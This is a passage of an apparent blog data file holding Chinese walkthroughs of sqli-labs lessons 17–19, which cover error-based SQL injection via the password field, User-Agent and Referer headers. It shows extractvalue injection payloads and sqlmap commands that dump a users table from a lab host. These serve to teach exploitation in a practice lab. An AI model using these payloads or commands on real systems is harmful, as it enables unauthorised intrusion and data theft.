class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data:指定请求信息</span><br><span class=\"line\"></span><br><span class=\"line\">-p:指定参数</span><br><span class=\"line\"></span><br><span class=\"line\">--dbms:指定后端数据库</span><br><span class=\"line\"></span><br><span class=\"line\">--threads:指定并发线程数</span><br><span class=\"line\"></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span>:</span>指定请求方式</span><br><span class=\"line\"></span><br><span class=\"line\">--flush-session:清除session</span><br><span class=\"line\"></span><br><span class=\"line\">--fresh-queries:发起新的请求</span><br><span class=\"line\"></span><br><span class=\"line\">--level <span class=\"number\">1</span>:尝试POST和GET注入 </span><br><span class=\"line\"></span><br><span class=\"line\">--risk <span class=\"number\">1</span>:仅测试常见用例</span><br><span class=\"line\"></span><br><span class=\"line\">--technique E:仅测试报错注入方式</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-17/&quot; --data &quot;uname=admin&amp;passwd=woshiadmin&amp;submit=Submit&quot; -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-17/19.png\" alt=\"19\"></p>\n<p>在出现这条提示后先不要执行,查看数据库,发现admin账号的密码被修改。</p>\n<p><img src=\"/img/sql/Lesson-17/20.png\" alt=\"20\"></p>\n<p><font color=\"red\">已经找到了可能注入点,不需要测试所有用例,因为所有用例中必定会有or的用例,会对数据库进行破坏,选n</font></p>\n<p><img src=\"/img/sql/Lesson-17/21.png\" alt=\"21\"></p>\n<p>继续用no</p>\n<p><img src=\"/img/sql/Lesson-17/22.png\" alt=\"22\"></p>\n<p>接下来就对了。</p>\n<p><code>sqlmap -u &quot;http://10.60.250.66/sql/Less-17/&quot; --data &quot;uname=admin&amp;passwd=woshiadmin&amp;submit=Submit&quot; -p passwd --dbms mysql --threads 10 --method POST  --level 1 --risk 1 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-17/23.png\" alt=\"23\"></p>\n"},{"title":"sqli-labs lession 18 POST基于错误的Uagent字段数据头注入","date":"2018-09-28T11:30:37.000Z","_content":"# sqli-labs lession 18 POST基于错误的Uagent字段数据头注入 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-18/1.png)\n\n## 分析 ##\n\n显示了咱的ip地址...嗯...测试了下Username和Password的输入数据,发现没有什么搞头。用个admin账号登录成功试了下。\n\n![2](/img/sql/Lesson-18/2.png)\n\n把我的User-Agent信息显示了出来。\n\nUser-Agent干什么用呢:\n\n![3](/img/sql/Lesson-18/3.png)\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0`\n\n对照一下手册查看信息\n\nMozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion\n\n* Mozilla/5.0 是一个通用标记符号，用来表示与 Mozilla 兼容，这几乎是现代浏览器的标配。\n  \n* platform 用来说明浏览器所运行的原生系统平台（例如 Windows、Mac、Linux 或 Android），以及是否运行在手机上。搭载 Firefox OS 的手机仅简单地使用了 \"Mobile\" 这个字符串；因为 web 本身就是平台。注意 platform 可能会包含多个使用 \"; \" 隔开的标记符号。\n  \n* rv:geckoversion 表示 Gecko 的发布版本号（例如  \"17.0\"）。在近期发布的版本中，geckoversion 表示的值与 firefoxversion 相同。\n  \n* Gecko/geckotrail 表示该浏览器基于 Gecko 渲染引擎。\n\n* 在桌面浏览器中， geckotrail  是固定的字符串 \"20100101\" 。\n  \n* Firefox/firefoxversion 表示该浏览器是 Firefox，并且提供了版本号信息（例如  \"17.0\"）。\n\n拿到了我的信息总要有点东西留给我的吧。\n\n查看源码：\n\n![4](/img/sql/Lesson-18/4.png)\n\n对账户密码做了过滤,登录成功后接着又把ip地址和User-Agent信息保存下了数据库的`uagents`表中。\n\n![5](/img/sql/Lesson-18/5.png)\n\n因为插入User-Agent信息插入数据表的时候没有检查,可以在此处利用报错注入。\n\n## 注入 ##\n\n先用正确账号登录。\n\n![6](/img/sql/Lesson-18/6.png)\n\n再在`User-Agent`构造报错。\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1`\n\n检查出单引号闭合。\n\n![7](/img/sql/Lesson-18/7.png)\n\npayload:\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`\n\n![8](/img/sql/Lesson-18/8.png)\n\n中间与Lesson-17一样,直接上获取列的图\n\n![9](/img/sql/Lesson-18/9.png)\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e)) and '1'='1`\n\n## SQLMAP ##\n\n```\n--leveal \n\nlevel: 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量\n\n--user-agent\n\n指定User-Agent\n\n--data\n\n指定请求的内容\n\n--threads\n\n指定并发线程\n\n--dbms\n\n指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.\n\n--fresh-queries \n\nfresh-queries会忽略之前的查询结果,进行重新请求操作\n\n--flush-session\n\nflush-session会清空当前URL相关的session\n```\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data \"uname=admin&passwd=admin&submit=Submit\" --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1\" --level 4 --threads 10 --dbms mysql --fresh-queries --flush-session`\n\n![10](/img/sql/Lesson-18/10.png)\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data \"uname=admin&passwd=admin&submit=Submit\" --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1\" -D security -T users --columns --dump`\n\n![11](/img/sql/Lesson-18/11.png)","source":"_posts/sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入.md","raw":"---\ntitle: sqli-labs lession 18 POST基于错误的Uagent字段数据头注入\ndate: 2018-09-28 19:30:37\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 18 POST基于错误的Uagent字段数据头注入 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-18/1.png)\n\n## 分析 ##\n\n显示了咱的ip地址...嗯...测试了下Username和Password的输入数据,发现没有什么搞头。用个admin账号登录成功试了下。\n\n![2](/img/sql/Lesson-18/2.png)\n\n把我的User-Agent信息显示了出来。\n\nUser-Agent干什么用呢:\n\n![3](/img/sql/Lesson-18/3.png)\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0`\n\n对照一下手册查看信息\n\nMozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion\n\n* Mozilla/5.0 是一个通用标记符号，用来表示与 Mozilla 兼容，这几乎是现代浏览器的标配。\n  \n* platform 用来说明浏览器所运行的原生系统平台（例如 Windows、Mac、Linux 或 Android），以及是否运行在手机上。搭载 Firefox OS 的手机仅简单地使用了 \"Mobile\" 这个字符串；因为 web 本身就是平台。注意 platform 可能会包含多个使用 \"; \" 隔开的标记符号。\n  \n* rv:geckoversion 表示 Gecko 的发布版本号（例如  \"17.0\"）。在近期发布的版本中，geckoversion 表示的值与 firefoxversion 相同。\n  \n* Gecko/geckotrail 表示该浏览器基于 Gecko 渲染引擎。\n\n* 在桌面浏览器中， geckotrail  是固定的字符串 \"20100101\" 。\n  \n* Firefox/firefoxversion 表示该浏览器是 Firefox，并且提供了版本号信息（例如  \"17.0\"）。\n\n拿到了我的信息总要有点东西留给我的吧。\n\n查看源码：\n\n![4](/img/sql/Lesson-18/4.png)\n\n对账户密码做了过滤,登录成功后接着又把ip地址和User-Agent信息保存下了数据库的`uagents`表中。\n\n![5](/img/sql/Lesson-18/5.png)\n\n因为插入User-Agent信息插入数据表的时候没有检查,可以在此处利用报错注入。\n\n## 注入 ##\n\n先用正确账号登录。\n\n![6](/img/sql/Lesson-18/6.png)\n\n再在`User-Agent`构造报错。\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1`\n\n检查出单引号闭合。\n\n![7](/img/sql/Lesson-18/7.png)\n\npayload:\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`\n\n![8](/img/sql/Lesson-18/8.png)\n\n中间与Lesson-17一样,直接上获取列的图\n\n![9](/img/sql/Lesson-18/9.png)\n\n`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and  extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e)) and '1'='1`\n\n## SQLMAP ##\n\n```\n--leveal \n\nlevel: 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量\n\n--user-agent\n\n指定User-Agent\n\n--data\n\n指定请求的内容\n\n--threads\n\n指定并发线程\n\n--dbms\n\n指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.\n\n--fresh-queries \n\nfresh-queries会忽略之前的查询结果,进行重新请求操作\n\n--flush-session\n\nflush-session会清空当前URL相关的session\n```\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data \"uname=admin&passwd=admin&submit=Submit\" --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1\" --level 4 --threads 10 --dbms mysql --fresh-queries --flush-session`\n\n![10](/img/sql/Lesson-18/10.png)\n\n`sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data \"uname=admin&passwd=admin&submit=Submit\" --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1\" -D security -T users --columns --dump`\n\n![11](/img/sql/Lesson-18/11.png)","slug":"sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入","published":1,"updated":"2019-06-19T17:23:13.386Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcy002d4dsbbq55xojl","content":"<h1 id=\"sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入\"><a href=\"#sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 18 POST基于错误的Uagent字段数据头注入\"></a>sqli-labs lession 18 POST基于错误的Uagent字段数据头注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-18/1.png\" alt=\"1\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>显示了咱的ip地址…嗯…测试了下Username和Password的输入数据,发现没有什么搞头。用个admin账号登录成功试了下。</p>\n<p><img src=\"/img/sql/Lesson-18/2.png\" alt=\"2\"></p>\n<p>把我的User-Agent信息显示了出来。</p>\n<p>User-Agent干什么用呢:</p>\n<p><img src=\"/img/sql/Lesson-18/3.png\" alt=\"3\"></p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0</code></p>\n<p>对照一下手册查看信息</p>\n<p>Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion</p>\n<ul>\n<li><p>Mozilla/5.0 是一个通用标记符号，用来表示与 Mozilla 兼容，这几乎是现代浏览器的标配。</p>\n</li>\n<li><p>platform 用来说明浏览器所运行的原生系统平台（例如 Windows、Mac、Linux 或 Android），以及是否运行在手机上。搭载 Firefox OS 的手机仅简单地使用了 “Mobile” 这个字符串；因为 web 本身就是平台。注意 platform 可能会包含多个使用 “; “ 隔开的标记符号。</p>\n</li>\n<li><p>rv:geckoversion 表示 Gecko 的发布版本号（例如  “17.0”）。在近期发布的版本中，geckoversion 表示的值与 firefoxversion 相同。</p>\n</li>\n<li><p>Gecko/geckotrail 表示该浏览器基于 Gecko 渲染引擎。</p>\n</li>\n<li><p>在桌面浏览器中， geckotrail  是固定的字符串 “20100101” 。</p>\n</li>\n<li><p>Firefox/firefoxversion 表示该浏览器是 Firefox，并且提供了版本号信息（例如  “17.0”）。</p>\n</li>\n</ul>\n<p>拿到了我的信息总要有点东西留给我的吧。</p>\n<p>查看源码：</p>\n<p><img src=\"/img/sql/Lesson-18/4.png\" alt=\"4\"></p>\n<p>对账户密码做了过滤,登录成功后接着又把ip地址和User-Agent信息保存下了数据库的<code>uagents</code>表中。</p>\n<p><img src=\"/img/sql/Lesson-18/5.png\" alt=\"5\"></p>\n<p>因为插入User-Agent信息插入数据表的时候没有检查,可以在此处利用报错注入。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>先用正确账号登录。</p>\n<p><img src=\"/img/sql/Lesson-18/6.png\" alt=\"6\"></p>\n<p>再在<code>User-Agent</code>构造报错。</p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>检查出单引号闭合。</p>\n<p><img src=\"/img/sql/Lesson-18/7.png\" alt=\"7\"></p>\n<p>payload:</p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and  extractvalue(null,concat(0x7e,database(),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-18/8.png\" alt=\"8\"></p>\n<p>中间与Lesson-17一样,直接上获取列的图</p>\n<p><img src=\"/img/sql/Lesson-18/9.png\" alt=\"9\"></p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and  extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--leveal </span></span><br><span class=\"line\"></span><br><span class=\"line\">level: 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--user-agent</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定User-Agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--data</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定请求的内容</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--threads</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定并发线程</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--dbms</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries </span></span><br><span class=\"line\"></span><br><span class=\"line\">fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--flush-session</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">flush</span>-<span class=\"keyword\">session</span>会清空当前<span class=\"keyword\">URL</span>相关的<span class=\"keyword\">session</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1&quot; --level 4 --threads 10 --dbms mysql --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-18/10.png\" alt=\"10\"></p>\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-18/11.png\" alt=\"11\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入\"><a href=\"#sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 18 POST基于错误的Uagent字段数据头注入\"></a>sqli-labs lession 18 POST基于错误的Uagent字段数据头注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-18/1.png\" alt=\"1\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>显示了咱的ip地址…嗯…测试了下Username和Password的输入数据,发现没有什么搞头。用个admin账号登录成功试了下。</p>\n<p><img src=\"/img/sql/Lesson-18/2.png\" alt=\"2\"></p>\n<p>把我的User-Agent信息显示了出来。</p>\n<p>User-Agent干什么用呢:</p>\n<p><img src=\"/img/sql/Lesson-18/3.png\" alt=\"3\"></p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0</code></p>\n<p>对照一下手册查看信息</p>\n<p>Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion</p>\n<ul>\n<li><p>Mozilla/5.0 是一个通用标记符号，用来表示与 Mozilla 兼容，这几乎是现代浏览器的标配。</p>\n</li>\n<li><p>platform 用来说明浏览器所运行的原生系统平台（例如 Windows、Mac、Linux 或 Android），以及是否运行在手机上。搭载 Firefox OS 的手机仅简单地使用了 “Mobile” 这个字符串；因为 web 本身就是平台。注意 platform 可能会包含多个使用 “; “ 隔开的标记符号。</p>\n</li>\n<li><p>rv:geckoversion 表示 Gecko 的发布版本号（例如  “17.0”）。在近期发布的版本中，geckoversion 表示的值与 firefoxversion 相同。</p>\n</li>\n<li><p>Gecko/geckotrail 表示该浏览器基于 Gecko 渲染引擎。</p>\n</li>\n<li><p>在桌面浏览器中， geckotrail  是固定的字符串 “20100101” 。</p>\n</li>\n<li><p>Firefox/firefoxversion 表示该浏览器是 Firefox，并且提供了版本号信息（例如  “17.0”）。</p>\n</li>\n</ul>\n<p>拿到了我的信息总要有点东西留给我的吧。</p>\n<p>查看源码：</p>\n<p><img src=\"/img/sql/Lesson-18/4.png\" alt=\"4\"></p>\n<p>对账户密码做了过滤,登录成功后接着又把ip地址和User-Agent信息保存下了数据库的<code>uagents</code>表中。</p>\n<p><img src=\"/img/sql/Lesson-18/5.png\" alt=\"5\"></p>\n<p>因为插入User-Agent信息插入数据表的时候没有检查,可以在此处利用报错注入。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>先用正确账号登录。</p>\n<p><img src=\"/img/sql/Lesson-18/6.png\" alt=\"6\"></p>\n<p>再在<code>User-Agent</code>构造报错。</p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>检查出单引号闭合。</p>\n<p><img src=\"/img/sql/Lesson-18/7.png\" alt=\"7\"></p>\n<p>payload:</p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and  extractvalue(null,concat(0x7e,database(),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-18/8.png\" alt=\"8\"></p>\n<p>中间与Lesson-17一样,直接上获取列的图</p>\n<p><img src=\"/img/sql/Lesson-18/9.png\" alt=\"9\"></p>\n<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and  extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e)) and &#39;1&#39;=&#39;1</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--leveal </span></span><br><span class=\"line\"></span><br><span class=\"line\">level: 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--user-agent</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定User-Agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--data</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定请求的内容</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--threads</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定并发线程</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--dbms</span></span><br><span class=\"line\"></span><br><span class=\"line\">指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--fresh-queries </span></span><br><span class=\"line\"></span><br><span class=\"line\">fresh-queries会忽略之前的查询结果,进行重新请求操作</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--flush-session</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">flush</span>-<span class=\"keyword\">session</span>会清空当前<span class=\"keyword\">URL</span>相关的<span class=\"keyword\">session</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1&quot; --level 4 --threads 10 --dbms mysql --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-18/10.png\" alt=\"10\"></p>\n<p><code>sqlmap -u http://10.60.250.66/sqlilabs/Less-18/ --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#39; and &#39;1&#39;=&#39;1&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-18/11.png\" alt=\"11\"></p>\n"},{"title":"sqli-labs lession 19 POST基于错误的Referer字段数据头注入","date":"2018-09-29T11:49:33.000Z","_content":"# sqli-labs lession 19 POST基于错误的Referer字段数据头注入 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-19/1.png)\n\n## 注入 ##\n\n根据题目提示直接在Referer字段尝试。\n\n![2](/img/sql/Lesson-19/2.png)\n\n单引号引起报错\n\n![3](/img/sql/Lesson-19/3.png)\n\n抑制下一个单引号\n\n![4](/img/sql/Lesson-19/4.png)\n\npayload:\n\n`http://10.60.250.66/sql/Less-19/' and extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`\n\n![5](/img/sql/Lesson-19/5.png)\n\n详细过程看Lesson-18\n\n{% post_link sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入 点击查看%}\n\n## SQLMAP ##\n\n```\n--data:指定请求数据\n\n--method:指定请求方式\n\n--dbms:指定后端数据库\n\n--thread:指定并发线程\n\n--referer:指定referer字段\n\n--level 3:加入检测User-Agent和Referer\n\n--technique E:检测报错注入\n```\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-19/\" --data \"uname=admin&passwd=admin&submit=Submit\" --method POST --dbms mysql --threads 10 --referer \"http://10.60.250.66/sql/Less-19/' and '1'='1\" --level 3 --technique E `\n\n![6](/img/sql/Lesson-19/6.png)\n\n![7](/img/sql/Lesson-19/7.png)\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-19/\" --data \"uname=admin&passwd=admin&submit=Submit\" --method POST --dbms mysql --threads 10 --referer \"http://10.60.250.66/sql/Less-19/' and '1'='1\" --level 3 --technique E -D security -T users --columns --dump`\n\n![8](/img/sql/Lesson-19/8.png)","source":"_posts/sqli-labs-lession-19-POST基于错误的Referer字段数据头注入.md","raw":"---\ntitle: sqli-labs lession 19 POST基于错误的Referer字段数据头注入\ndate: 2018-09-29 19:49:33\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 19 POST基于错误的Referer字段数据头注入 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-19/1.png)\n\n## 注入 ##\n\n根据题目提示直接在Referer字段尝试。\n\n![2](/img/sql/Lesson-19/2.png)\n\n单引号引起报错\n\n![3](/img/sql/Lesson-19/3.png)\n\n抑制下一个单引号\n\n![4](/img/sql/Lesson-19/4.png)\n\npayload:\n\n`http://10.60.250.66/sql/Less-19/' and extractvalue(null,concat(0x7e,database(),0x7e)) and '1'='1`\n\n![5](/img/sql/Lesson-19/5.png)\n\n详细过程看Lesson-18\n\n{% post_link sqli-labs-lession-18-POST基于错误的Uagent字段数据头注入 点击查看%}\n\n## SQLMAP ##\n\n```\n--data:指定请求数据\n\n--method:指定请求方式\n\n--dbms:指定后端数据库\n\n--thread:指定并发线程\n\n--referer:指定referer字段\n\n--level 3:加入检测User-Agent和Referer\n\n--technique E:检测报错注入\n```\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-19/\" --data \"uname=admin&passwd=admin&submit=Submit\" --method POST --dbms mysql --threads 10 --referer \"http://10.60.250.66/sql/Less-19/' and '1'='1\" --level 3 --technique E `\n\n![6](/img/sql/Lesson-19/6.png)\n\n![7](/img/sql/Lesson-19/7.png)\n\n`sqlmap -u \"http://10.60.250.66/sql/Less-19/\" --data \"uname=admin&passwd=admin&submit=Submit\" --method POST --dbms mysql --threads 10 --referer \"http://10.60.250.66/sql/Less-19/' and '1'='1\" --level 3 --technique E -D security -T users --columns --dump`\n\n![8](/img/sql/Lesson-19/8.png)","slug":"sqli-labs-lession-19-POST基于错误的Referer字段数据头注入","published":1,"updated":"2019-06-19T17:23:13.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd0002f4dsb7rvasw2i","content":"<h1 id=\"sqli-labs-lession-19-POST基于错误的Referer字段数据头注入\"><a href=\"#sqli-labs-lession-19-POST基于错误的Referer字段数据头注入\" class=\"headerlink\" title=\"sqli-labs lession 19 POST基于错误的Referer字段数据头注入\"></a>sqli-labs lession 19 POST基于错误的Referer字段数据头注入</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-19/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>根据题目提示直接在Referer字段尝试。</p>\n<p><img src=\"/img/sql/Lesson-19/2.png\" alt=\"2\"></p>\n<p>单引号引起报错</p>\n<p><img src=\"/img/sql/Lesson-19/3.png\" alt=\"3\"></p>\n<p>抑制下一个单引号</p>\n<p><img 